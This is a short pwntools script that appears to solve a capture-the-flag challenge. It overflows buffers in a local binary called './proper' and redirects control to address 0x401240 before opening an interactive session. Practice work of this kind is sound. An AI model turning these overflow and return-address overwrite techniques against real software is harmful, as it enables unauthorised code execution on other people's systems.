from pwn import *

elf = context.binary = ELF("./proper", checksec=False)
io = process("./proper")

io.sendline(b"A" * 268 + b"B")
io.sendline(b"A" * 520 + p32(41) + b"B")
io.sendline(b"A" * 76 + p32(13371337)[:3])
io.sendline(b"A" * 6768 + b"B" * 8 + p64(0x401240))

io.interactive()
